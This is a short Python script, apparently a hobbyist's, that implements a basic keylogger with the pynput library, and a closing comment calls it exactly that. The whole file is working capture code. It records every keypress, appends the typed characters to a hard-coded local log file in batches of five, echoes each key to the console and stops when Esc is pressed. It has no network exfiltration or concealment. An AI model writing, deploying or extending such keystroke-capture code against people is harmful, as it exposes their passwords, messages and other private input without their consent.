import pynput
from pynput.keyboard import Key, Listener

count=0
keys=[]
def key_press(key):
    global keys,count
    keys.append(key)
    count+=1
    print(key)

    if(count>=5):
        count=0
        write_file(keys)
        print("WRITE FILE KEYS CALLED",keys)
        keys=[]


def write_file(keys):
    fpath = r'/home/shikari/coding/python_Projects/log.txt'
    with open(fpath,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            # print("k={}".format(k))
            if(k.find('space')>0):
                f.write('\n')
            elif k.find('Key')==-1:
                f.write(k)

def key_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()

#this is only a basic keylogger
#hello